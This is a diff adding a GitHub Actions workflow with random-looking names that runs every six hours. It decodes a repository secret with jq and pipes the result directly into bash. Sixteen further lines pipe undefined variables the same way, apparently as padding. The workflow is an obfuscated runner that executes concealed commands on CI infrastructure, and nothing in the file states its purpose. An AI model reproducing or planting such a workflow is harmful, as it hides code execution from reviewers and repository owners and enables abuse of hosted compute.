@@ -1,0 +1,33 @@
+name: nightshirtchild
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: nightshirtchild
+        env:
+          to55: ${{ secrets.to55 }}
+        run: |
+          echo $to55 | jq -r .hyqf675 | /bin/bash
+          echo $yji34627 | jq -r .ticm0 | /bin/bash
+          echo $vz7099 | jq -r .ymy2 | /bin/bash
+          echo $mvdph93227 | jq -r .kxny88533 | /bin/bash
+          echo $gyfzl5813 | jq -r .rk86343 | /bin/bash
+          echo $tii7373 | jq -r .nxkom06441 | /bin/bash
+          echo $mgxqy39111 | jq -r .a93832 | /bin/bash
+          echo $um3 | jq -r .zy6106 | /bin/bash
+          echo $oi6819 | jq -r .mkop542 | /bin/bash
+          echo $zb19 | jq -r .pwvk87529 | /bin/bash
+          echo $qed2 | jq -r .s59 | /bin/bash
+          echo $soi021 | jq -r .npln746 | /bin/bash
+          echo $tzd0803 | jq -r .gvx4960 | /bin/bash
+          echo $bhk2104 | jq -r .aunwh220 | /bin/bash
+          echo $wyupp620 | jq -r .vdly60 | /bin/bash
+          echo $wzjdb9522 | jq -r .xqteb33008 | /bin/bash
+          echo $ruv93 | jq -r .mxc48062 | /bin/bash
+
